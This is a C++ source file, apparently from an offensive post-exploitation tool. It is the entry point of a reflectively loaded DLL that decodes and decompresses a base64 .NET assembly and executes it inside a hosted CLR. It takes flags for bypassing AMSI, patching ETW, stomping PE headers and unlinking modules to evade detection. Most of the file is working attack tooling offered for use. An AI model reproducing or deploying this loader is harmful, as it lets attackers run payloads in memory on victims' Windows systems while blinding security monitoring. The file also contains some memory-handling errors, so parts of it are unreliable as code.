//Author: @med0x2e

#include "Loader.h"
#include <stdio.h>
#include "Helpers.h"
#include "HostCLR.h"
#include <string>
#include "GZUtil.h"

extern HINSTANCE hAppInstance;

using namespace std;

#define MAX_CLIARG_COUNT 50
#define MAX_ARG_LENGTH 150
#define FLAGS_COUNT 4

struct _ARGUMENTS
{
	static const LPCWSTR DELIMITER;

	_ARGUMENTS(LPCWSTR _oneliner)
	{
		size_t i = 0;
		wstring _onelinerpld(_oneliner);
		wstring* args[] = { &_amsi, &_etw, &_stompheaders, &_unlinkmodules };

		while (_onelinerpld.find(DELIMITER) != wstring::npos && i < FLAGS_COUNT)
		{
			*args[i++] = _onelinerpld.substr(0, _onelinerpld.find(DELIMITER));
			_onelinerpld.erase(0, _onelinerpld.find(DELIMITER) + 1);
		}
	}

	wstring _amsi;
	wstring _etw;
	wstring _stompheaders;
	wstring _unlinkmodules;
};

const LPCWSTR _ARGUMENTS::DELIMITER = L"|";

size_t getCompressedAssemblyLen(LPSTR data, uint8_t _lenbinLength) {

	size_t _binLength = 0;
	LPSTR pChar = (LPSTR)malloc(sizeof(BYTE) * _lenbinLength + 1);
	pChar[_lenbinLength] = '\0';

	for (size_t l = 0; l < _lenbinLength; l++) { pChar[l] = data[l + 1]; }
	sscanf(pChar, "%d", &_binLength);
	free(pChar);

	printf("[i]: .NET Assembly Length: %d bytes\n", _binLength);
	fflush(stdout);

	return _binLength;
}

LPSTR* getAssemblyArgs(LPSTR data, LPSTR b64Assembly, uint32_t* count) {

	printf("[+]: Parsing Arguments \n:");
	fflush(stdout);

	LPSTR* args = (LPSTR*)malloc(MAX_CLIARG_COUNT * sizeof(LPSTR));

	for (int _c = 0; _c < MAX_CLIARG_COUNT; _c++) {
		args[_c] = (LPSTR)malloc(MAX_ARG_LENGTH * sizeof(BYTE));
	}

	TCHAR _openChr[] = { "\"\'" };
	TCHAR _closeChr[] = { "\"\'}" };

	TCHAR _argsStr[MAX_ARG_LENGTH];
	strcpy_s(_argsStr, strlen((data + strlen(b64Assembly) + 1)) + 1, (data + strlen(b64Assembly) + 1));

	LPSTR _arg = strmbtok(_argsStr, " ", _openChr, _closeChr);
	strcpy(args[*count], _arg);
	(*count)++;

	while ((_arg = strmbtok(NULL, " ", _openChr, _closeChr)) != NULL) {
		strcpy(args[*count], _arg);
		(*count)++;
	}

	size_t i = 0;
	while (i < *count) {
		removeChar(args[i], '\"');
		i++;
	}

	*count > 0 ? printf("\t[i]: Args count: %d\n", *count) : printf("\t[i]:No Args.\n");
	fflush(stdout);

	return args;

}

BOOL de64compress(LPSTR b64Assembly, size_t _binLength, size_t* assemblyLength, LPSTR* assemblyBytes, LPSTR* _decompressedData, ULONG* _decompressedDataLen) {

	printf("[+]: Base64 Decoding & Decompressing .NET Assembly... \n");
	fflush(stdout);

	//b64 decoding to byte array.
	*assemblyLength = b64DecodeSize(b64Assembly) + 1;
	*assemblyBytes = (LPSTR)malloc((*assemblyLength));

	if (!b64Decode(b64Assembly, *assemblyBytes, *assemblyLength)) {
		printf("[-]: Base64 Decoding Failure\n");
		fflush(stdout);
		return -1;
	}

	//gzip decompressing
	*_decompressedData = (LPSTR)malloc(_binLength);
	*_decompressedDataLen = _binLength;

	if (assemblyLength > 0) {
		size_t res = decompress(*_decompressedData, _decompressedDataLen, *assemblyBytes, *assemblyLength);
		if (Z_OK != res) {
			printf("[-]:Decompressing Failure\n");
			fflush(stdout);
			return 0;
		}
	}

	printf("[+]: Base64 Decoding & Decompressing Done.\n");
	_separator();
	fflush(stdout);

	return 1;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{

	BOOL bReturnValue = TRUE;

	switch (dwReason) {

	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;

	case DLL_PROCESS_ATTACH:

		hAppInstance = hinstDLL;
		if (lpReserved != NULL) {

			_separator();
			fflush(stdout);

			// lpReserved: AMSI_FLAG|ETW_FLAG|STOMPHEADERS_FLAG|UNLINKMODULES_FLAG|LLENGTH_FLAG.LENGTH_FLAG.B64_COMPRESS_PAYLOAD.ARGUMENTS
			LPSTR data = (LPSTR)lpReserved;

			//Extracting CLI options (_flags)
			LPCWSTR lpReservedW;
			size_t _leng = MultiByteToWideChar(CP_ACP, 0, data, -1, NULL, 0);
			lpReservedW = new WCHAR[_leng];
			MultiByteToWideChar(CP_ACP, 0, data, -1, (LPWSTR)lpReservedW, _leng);
			_ARGUMENTS _flags(lpReservedW);

			//Assembly length
			data = data + 8;
			uint8_t _lenbinLength = data[0] - '0';
			size_t _binLength = getCompressedAssemblyLen(data, _lenbinLength);

			//Extracting the encoded b64 assembly first
			data = data + _lenbinLength + 1;
			LPSTR currentArg;
			LPSTR nextArg;
			//currentArg = strtok_s(data, " ", &nextArg);
			LPSTR _del = " ";
			nextArg = (LPSTR)malloc(_binLength);
			currentArg = _strtok(data, _del, nextArg, _binLength);
			free(nextArg);
			LPSTR b64Assembly = trim(currentArg);

			//retrieving arguments
			uint32_t count = 0;
			LPSTR* args = getAssemblyArgs(data, b64Assembly, &count);


			//base64 decode and gzip decompress
			size_t assemblyLength = NULL;
			LPSTR assemblyBytes = NULL;
			LPSTR _decompressedData = (LPSTR)malloc(_binLength);
			ULONG _decompressedDataLen = _binLength;

			if (!de64compress(b64Assembly, _binLength, &assemblyLength, &assemblyBytes, &_decompressedData, &_decompressedDataLen)) {
				printf("[*]:Base64/Decompress Error.\n");
				fflush(stdout);
				return -1;
			}

			//load the assembly bytes array along side passed arguments.
			if (InjectAssembly(_decompressedData, _decompressedDataLen, args, count,
				_flags._unlinkmodules.c_str(), _flags._stompheaders.c_str(),
				_flags._amsi.c_str(), _flags._etw.c_str()) == 1) {

				printf("[*]:Assembly Execution Finished.\n");
				fflush(stdout);
			}
			else {
				printf("[!]: Something went wrong.\n");
				fflush(stdout);
			}

			//cleanup
			if (args != NULL) {
				for (size_t _c = 0; _c < count; _c++) {
					free(args[_c]);
				}
				free(args);
			}

			free(assemblyBytes);
			free(_decompressedData);
			delete[] lpReservedW;
			free(currentArg);

		}
		else {
			printf("[!]: Err\n");
			fflush(stdout);
		}

		fflush(stdout);

		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}




